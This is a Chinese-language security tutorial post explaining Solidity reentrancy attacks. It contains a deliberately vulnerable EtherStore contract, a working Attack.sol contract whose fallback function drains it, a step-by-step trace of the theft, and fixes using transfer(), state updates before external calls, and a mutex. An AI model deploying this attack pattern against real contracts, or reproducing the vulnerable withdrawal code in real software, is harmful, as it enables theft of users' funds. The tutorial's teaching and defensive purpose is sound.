---
layout:     post
title:      智能合约安全-Reentrancy(重入攻击)
date:       2020-02-23
author:     Yuane
header-img: img/home-bg.jpg
catalog: true
tags:
    - Blockchain
---



## 0x01 重入攻击

重入攻击是由于solidity智能合约的特性，再加上编写不当造成的。

主要流程为：攻击者编写攻击合约，调用受害合约，利用自己的fallback函数，循环调用受害合约的代码。

臭名昭著的DAO攻击就是因为当时他们的智能合约中存在Re-Entrancy这个bug，ETC也是因为这个bug，硬分叉产生出来的链。



## 0x02 fallback()函数

根据[官方文档v0.6.3介绍](https://solidity.readthedocs.io/en/v0.6.3/contracts.html#fallback-function)，fallback函数介绍如下

> A contract can have at most one `fallback` function, declared using `fallback () external [payable]`(without the `function` keyword). This function cannot have arguments, cannot return anything and must have `external` visibility. It is executed on a call to the contract if none of the other functions match the given function signature, or if no data was supplied at all and there is no [receive Ether function](https://solidity.readthedocs.io/en/v0.6.3/contracts.html#receive-ether-function). The fallback function always receives data, but in order to also receive Ether it must be marked `payable`.



也就是说在如下两种情况下会执行fallback()函数

- 当外部账户或其他合约向该合约地址发送 ether 时；
- 当外部账户或其他合约调用了该合约一个不存在的函数时；



note：一个没有定义回退函数的合约，如果接收ether，会触发异常，并返还ether（solidity v0.4.0开始）。所以合约要接收ether，必须实现回退函数。

如下所示:

```js
pragma solidity ^0.4.0;

contract Test {
    // This function is called for all messages sent to
    // this contract (there is no other function).
    // Sending Ether to this contract will cause an exception,
    // because the fallback function does not have the "payable"
    // modifier.
    function() { x = 1; }
    uint x;
}


// This contract keeps all Ether sent to it with no way
// to get it back.
contract Sink {
    function() payable { }
}


contract Caller {
    function callTest(Test test) {
        test.call(0xabcdef01); // hash does not exist
        // results in test.x becoming == 1.

        // The following call will fail, reject the
        // Ether and return false:
        test.send(2 ether);
    }
}
```



## 0x03 实例

引用自https://blog.sigmaprime.io/solidity-security.html

为了说明重入攻击流程，考虑如下合约。

EtherStore.sol：

```js
//该合约充当以太坊保险库，允许存款人每周只提取 1 个 Ether。
contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }
```

该合约有两个公共职能。 `depositFunds()` 和 `withdrawFunds()` 。

该 `depositFunds()` 功能只是增加发件人余额。

该 `withdrawFunds()` 功能允许发件人指定要撤回的 wei 的数量。如果所要求的退出金额小于 1Ether 并且在上周没有发生撤回，它才会成功。



**那么漏洞出现在哪呢？**

**漏洞出现在17行`require(msg.sender.call.value(_weiToWithdraw)());`**

**当该合约向用户发送ether时，就会调用用户的fallback函数。**

**如果该用户是恶意的，就可以通过修改自己的fallback函数来控制程序流程。**



考虑如下攻击合约

Attack.sol：

```js
import "EtherStore.sol";

contract Attack {
  EtherStore public etherStore;

  // intialise the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(1 ether)();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (etherStore.balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}
```

攻击者可以（假定恶意合约地址为 `0x0...123`）使用 `EtherStore` 合约地址作为构造函数参数来创建上述合约。这将初始化并将公共变量 `etherStore` 指向我们想要攻击的合约。

然后攻击者会调用这个 `pwnEtherStore()` 函数，并存入一些 Ehter（大于或等于1），比方说 1Ehter，在这个例子中。在这个例子中，我们假设一些其他用户已经将若干 Ehter 存入这份合约中，比方说它的当前余额就是 `10 ether` 。然后会发生以下情况：

1. Attack.sol - 第15行- EtherStore 合约的 depositFunds() 函数将被调用，其中msg.value 为1 Ether（以及大量的Gas）。发件人（msg.sender）将是我们的恶意合约（0x0 ... 123）。因此，balances[0x0..123] = 1Ether。
2. Attack.sol - 第17行- 然后恶意合约将使用1 ether的参数调用EtherStore合约的withdrawFunds()函数。这将通过所有require语句（EtherStore合约的第[12] - [16]行），因为我们之前没有提取过。
3. EtherStore.sol - 第17行- 然后合约将1以太币发回恶意合约。
4. Attack.sol - 第25行- 发送给恶意合约的以太币将执行回退函数。
5. Attack.sol - 第26行- EtherStore 合约的总余额为10个以太币，现在为9个以太币，因此if语句通过。
6. Attack.sol - 第27行– 回退函数再次调用 EtherStore 的 withdrawFunds() 函数并“重新进入” EtherStore 合约。
7. EtherStore.sol - 第11行- 在第二次调用 withdrawFunds() 时，我们的余额仍为1以太，因为第18行尚未执行。因此，我们仍然有 balances[0x0..123] = 1 Ether。lastWithdrawTime 变量也是如此。我们再次通过了所有要求。
8. EtherStore.sol - 第17行- 我们提取另外1个以太币。
9. 步骤4-8将重复- 直到 EtherStore.balance<= 1，如 Attack.sol 中的第26行所示。
10. Attack.sol - 第26行 - 一旦 EtherStore 合约中剩下不多于1（或更少）的ether，则此if语句将失败。然后，这将允许执行 EtherStore 合约的第18和19行（对于withdrawFunds()函数的每次调用）。
11. EtherStore.sol – 第18和19行- 将设置 balances 和 lastWithdrawTime 映射，执行将结束。

最终的结果是，攻击者只用一笔交易，便立即从 EtherStore 合约中取出了（除去 1 个 Ether 以外）所有的 Ether。



## 0x04 预防

- 在发送ether时使用内置的`transfer()`函数(仅使用2300gas，不足以call其他合约)

- 确保所有更改状态变量的逻辑都在以太币被发送出合同（或任何外部调用）之前发生。

  ​	比如在`EtherStore`示例中，第[18]和[19]行`EtherStore.sol`应放在第[17]行之前

- 引入互斥锁。也就是说，添加一个状态变量，在代码执行期间锁定合约，防止重入调用。

将所有这些技术（这三项都是不必要的，但都是出于说明目的）应用于`EtherStore.sol`，可以得到无重入合同：

```js
contract EtherStore {

    // initialise the mutex
    bool reEntrancyMutex = false;
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(!reEntrancyMutex);
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
        // set the reEntrancy mutex before the external call
        reEntrancyMutex = true;
        msg.sender.transfer(_weiToWithdraw);
        // release the mutex after the external call
        reEntrancyMutex = false;
    }
 }
```



## 0x05 Refer

https://solidity.readthedocs.io/en/v0.6.3/contracts.html#fallback-function

https://solidity.tryblockchain.org/14825685263030.html

https://blog.sigmaprime.io/solidity-security.html#re-vuln

https://lalajun.github.io/2018/08/29/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/

https://cloud.tencent.com/developer/article/1413221

https://paper.seebug.org/601/#3-fallback